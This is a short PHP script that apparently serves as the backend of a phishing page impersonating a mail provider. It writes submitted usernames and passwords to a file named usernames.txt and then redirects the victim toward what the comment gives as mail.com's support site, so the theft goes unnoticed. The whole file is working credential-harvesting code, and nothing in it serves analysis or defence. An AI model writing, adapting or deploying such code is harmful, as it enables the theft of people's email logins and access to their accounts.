<?php
file_put_contents("usernames.txt", "Mail Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://support.mail.com
header("Location: $url");
exit();
?>